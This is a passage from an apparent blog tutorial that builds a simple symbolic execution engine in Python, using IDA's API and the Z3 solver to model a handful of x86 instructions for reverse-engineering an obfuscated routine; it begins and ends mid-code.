</span><span class='line'>In [5]: solve((sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2) == 0xdeadbeef)
</span><span class='line'>[sym1 = 0, sym2 = 3735928556]
</span><span class='line'>
</span><span class='line'>In [6]: solve((sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2) == 0xdeadbeef, sym1 !=  0)
</span><span class='line'>[sym1 = 1073741824, sym2 = 3735928556]
</span><span class='line'>
</span><span class='line'>In [7]: sym1 = 1073741824
</span><span class='line'>In [8]: sym2 = 3735928556
</span><span class='line'>
</span><span class='line'>In [9]: hex((sym2 + 1) ^ ((((sym1 &gt;&gt; 2) + 1) &lt;&lt; 1) &amp; 2) &amp; 0xffffffff)
</span><span class='line'>Out[9]: &#39;0xdeadbeefL&#39;
</span></code></pre></td></tr></table></div></figure>


<p>As you can imagine, that kind of tool is very valuable/handy when you do reverse-engineering tasks or bug-hunting. Unfortunately, our PoC won&rsquo;t be enough accurate/generic/complete to be used in &ldquo;normal&rdquo; cases, but never mind.</p>

<h1>Let&rsquo;s code</h1>

<p>To implement our little PoC we will use only <a href="https://code.google.com/p/idapython/">IDAPython</a> and <a href="http://rise4fun.com/z3py/">Z3Py</a>.</p>

<h2>The disassembler</h2>

<p>The first thing we have to do is to use IDA&rsquo;s API in order to have some inspection information about assembly instructions. The idea is just to have the mnemonic, the source and the destination operands easily ; here is the class I&rsquo;ve designed toward that purpose:</p>

<figure class='code'><figcaption><span>Disassembler class</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">Disassembler</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;A simple class to decode easily instruction in IDA&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">start</span> <span class="o">=</span> <span class="n">start</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">end</span> <span class="o">=</span> <span class="n">end</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">eip</span> <span class="o">=</span> <span class="n">start</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_decode_instr</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;Returns mnemonic, dst, src&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="n">mnem</span> <span class="o">=</span> <span class="n">GetMnem</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">)</span>
</span><span class='line'>        <span class="n">x</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>            <span class="n">ty</span> <span class="o">=</span> <span class="n">GetOpType</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span><span class='line'>            <span class="c"># cst</span>
</span><span class='line'>            <span class="k">if</span> <span class="mi">5</span> <span class="o">&lt;=</span> <span class="n">ty</span> <span class="o">&lt;=</span> <span class="mi">7</span><span class="p">:</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">GetOperandValue</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="n">x</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">GetOpnd</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="p">[</span><span class="n">mnem</span><span class="p">]</span> <span class="o">+</span> <span class="n">x</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_next_instruction</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;This is a convenient generator, you can iterator through</span>
</span><span class='line'><span class="sd">        each instructions easily&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">eip</span> <span class="o">!=</span> <span class="bp">self</span><span class="o">.</span><span class="n">end</span><span class="p">:</span>
</span><span class='line'>            <span class="k">yield</span> <span class="bp">self</span><span class="o">.</span><span class="n">_decode_instr</span><span class="p">()</span>
</span><span class='line'>            <span class="bp">self</span><span class="o">.</span><span class="n">eip</span> <span class="o">+=</span> <span class="n">ItemSize</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">eip</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>The symbolic execution engine</h2>

<p>There are several important parts in our engine:</p>

<ol>
<li>the part which &ldquo;emulates&rdquo; the assembly instruction.</li>
<li>the part which stores the different equations used through the routine. It is a simple Python dictionary: the key is a unique identifier, and the value is the equation</li>
<li>the CPU state. We also use a dictionary for that purpose: the key will be the register names, and the value will be what the register holds at that specific moment. Note we will only store the unique identifier of the equation. In fact, our design is really similar to Jonathan&rsquo;s one in &ldquo;<a href="http://shell-storm.org/blog/Binary-analysis-Concolic-execution-with-Pin-and-z3/">Binary analysis: Concolic execution with Pin and z3</a>&rdquo;, so please refer you to his cool pictures if it&rsquo;s not really clear :P.</li>
<li>the memory state ; in that dictionary we store memory references. Remember, if we find a non-initialized access to a memory area we instantiate a symbolic variable. That is our heuristic to find the symbolic variables automatically.</li>
</ol>


<p>Here is the PoC code:</p>

<figure class='code'><figcaption><span>SymbolicExecutionEngine class</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">prove</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;Taken from http://rise4fun.com/Z3Py/tutorialcontent/guide#h26&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Not</span><span class="p">(</span><span class="n">f</span><span class="p">))</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">unsat</span><span class="p">:</span>
</span><span class='line'>        <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>    <span class="k">return</span> <span class="bp">False</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">SymbolicExecutionEngine</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;The symbolic execution engine is the class that will</span>
</span><span class='line'><span class="sd">    handle the symbolic execution. It will keep a track of the </span>
</span><span class='line'><span class="sd">    different equations encountered, and the CPU context at each point of the program.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    The symbolic variables have to be found by the user (or using data-taing). This is not</span>
</span><span class='line'><span class="sd">    the purpose of this class.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    We are lucky, we only need to handle those operations &amp; encodings:</span>
</span><span class='line'><span class="sd">        . mov:</span>
</span><span class='line'><span class="sd">            . mov reg32, reg32</span>
</span><span class='line'><span class="sd">            . mov reg32, [mem]</span>
</span><span class='line'><span class="sd">            . mov [mem], reg32</span>
</span><span class='line'><span class="sd">        . shr:</span>
</span><span class='line'><span class="sd">            . shr reg32, cst</span>
</span><span class='line'><span class="sd">        . shl:</span>
</span><span class='line'><span class="sd">            . shl reg32, cst</span>
</span><span class='line'><span class="sd">        . and:</span>
</span><span class='line'><span class="sd">            . and reg32, cst</span>
</span><span class='line'><span class="sd">            . and reg32, reg32</span>
</span><span class='line'><span class="sd">        . xor:</span>
</span><span class='line'><span class="sd">            . xor reg32, cst</span>
</span><span class='line'><span class="sd">        . or:</span>
</span><span class='line'><span class="sd">            . or reg32, reg32</span>
</span><span class='line'><span class="sd">        . add:</span>
</span><span class='line'><span class="sd">            . add reg32, reg32</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    We also don&#39;t care about:</span>
</span><span class='line'><span class="sd">        . EFLAGS</span>
</span><span class='line'><span class="sd">        . branches</span>
</span><span class='line'><span class="sd">        . smaller registers (16/8 bits)</span>
</span><span class='line'><span class="sd">    Long story short: it&#39;s perfect ; that environment makes really easy to play with symbolic execution.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">):</span>
</span><span class='line'>        <span class="c"># This is the CPU context at each time</span>
</span><span class='line'>        <span class="c"># The value of the registers are index in the equations dictionnary</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>            <span class="s">&#39;eax&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;ebx&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;ecx&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;edx&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;esi&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;edi&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;ebp&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;esp&#39;</span> <span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;eip&#39;</span> <span class="p">:</span> <span class="bp">None</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The address where the symbolic execution will start</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">start</span> <span class="o">=</span> <span class="n">start</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The address where the symbolic execution will stop</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">end</span> <span class="o">=</span> <span class="n">end</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Our disassembler</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">disass</span> <span class="o">=</span> <span class="n">Disassembler</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># This is the memory that can be used by the instructions to save temporary values/results</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">mem</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Each equation must have a unique id</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The symbolic variables will be stored there</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Each equation will be stored here</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">equations</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_check_if_reg32</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;XXX: make a decorator?&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_push_equation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">e</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">equations</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">idx</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">set_reg_with_equation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">e</span><span class="p">):</span>
</span><span class='line'>        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_check_if_reg32</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>            <span class="k">return</span>
</span><span class='line'>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">r</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_push_equation</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_reg_equation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
</span><span class='line'>        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_check_if_reg32</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>            <span class="k">return</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">equations</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">r</span><span class="p">]]</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;Run from start address to end address the engine&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">mnemonic</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">disass</span><span class="o">.</span><span class="n">get_next_instruction</span><span class="p">():</span>
</span><span class='line'>            <span class="k">if</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;mov&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># mov reg32, reg32</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">src</span><span class="p">]</span>
</span><span class='line'>                <span class="c"># mov reg32, [mem]</span>
</span><span class='line'>                <span class="k">elif</span> <span class="p">(</span><span class="n">src</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;var_&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">src</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;arg&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">if</span> <span class="n">src</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">:</span>
</span><span class='line'>                        <span class="c"># A non-initialized location is trying to be read, we got a symbolic variable!</span>
</span><span class='line'>                        <span class="n">sym</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">&#39;arg</span><span class="si">%d</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">),</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span><span class='line'>                        <span class="k">print</span> <span class="s">&#39;Trying to read a non-initialized area, we got a new symbolic variable: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">sym</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">src</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_push_equation</span><span class="p">(</span><span class="n">sym</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">src</span><span class="p">]</span>
</span><span class='line'>                <span class="c"># mov [mem], reg32</span>
</span><span class='line'>                <span class="k">elif</span> <span class="n">dst</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;var_&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">if</span> <span class="n">dst</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">:</span>
</span><span class='line'>                        <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">None</span>
</span><span class='line'>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">[</span><span class="n">src</span><span class="p">]</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;mov&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;shr&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># shr reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">src</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">LShR</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">),</span> <span class="n">src</span><span class="p">))</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;shr&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;shl&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># shl reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">src</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;shl&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;and&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="n">x</span> <span class="o">=</span> <span class="bp">None</span>
</span><span class='line'>                <span class="c"># and reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">src</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
</span><span class='line'>                    <span class="n">x</span> <span class="o">=</span> <span class="n">src</span>
</span><span class='line'>                <span class="c"># and reg32, reg32</span>
</span><span class='line'>                <span class="k">elif</span> <span class="n">src</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span><span class="p">:</span>
</span><span class='line'>                    <span class="n">x</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;and&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>            <span class="k">elif</span> <span class="n">mnemonic</span> <span class="o">==</span> <span class="s">&#39;xor&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># xor reg32, cst</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">src</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">:</span>
